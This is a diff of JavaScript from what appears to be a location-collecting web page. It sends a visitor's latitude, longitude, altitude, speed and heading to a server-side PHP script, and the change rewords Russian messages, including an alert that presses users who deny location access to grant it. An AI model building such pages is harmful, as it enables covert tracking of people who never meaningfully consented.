@@ -23,7 +23,7 @@ function locate()
       type: 'POST',
       url: '/php/result.php',
       data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
-      success: function(){$('#change').html('Пожалуйста, подождите...');},
+      success: function(){$('#change').html('Загрузка. Пожалуйста, подождите...');},
       mimeType: 'text'
     });
   };
@@ -35,7 +35,7 @@ function showError(error)
   {
 		case error.PERMISSION_DENIED:
 			var denied = 'Пользователь отклонил запрос на геолокацию';
-      alert('Для корректной работы сервиса необходимо подтвердить местоположение');
+      alert('Для корректной работы сервиса, пожалуйста, предоставите доступ к местоположению');
       break;
 		case error.POSITION_UNAVAILABLE:
 			var unavailable = 'Информация о местоположении недоступна';
